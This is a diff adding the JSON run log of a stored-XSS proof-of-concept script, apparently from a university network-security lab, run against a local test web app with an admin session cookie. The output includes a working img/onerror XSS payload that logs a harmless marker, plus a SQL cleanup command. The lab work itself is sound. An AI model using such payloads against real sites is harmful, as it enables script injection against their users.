@@ -1,0 +1,28 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\XSS-005__1.py",
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_low.cookie",
+    "--security",
+    "low"
+  ],
+  "started_at": "2026-10-20T14:43:26+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.429,
+  "stdout": "[1] baseline GET status=200 rows=4 marker_present=True\r\n    note: a row named LLM_LAB already exists; delete it before writing\r\n[2] write POST status=200\r\n[3] read GET status=200 probe_rows=3\r\n    stored comment field: \"<img src=x onerror=console.log('LLM_LAB_XSS')>\"\r\n    raw_payload_in_field=True encoded_lt_in_field=False\r\n[4] control GET status=200 encoded_lt=True raw_payload=False\r\n[5] browser step: open http://127.0.0.1:9080/vulnerabilities/xss_s/ in the logged-in browser and watch DevTools console for LLM_LAB_XSS; the HTTP evidence above is not execution evidence\r\n[6] cleanup: DELETE FROM guestbook WHERE name = 'LLM_LAB'; then repeat step [3] to confirm the probe row is gone (do not use btnClear, it truncates all rows)\r\n",
+  "stderr": "",
+  "cohort": "v3",
+  "stem": "XSS-005__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\XSS-005__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_low.cookie",
+    "--security",
+    "low"
+  ]
+}
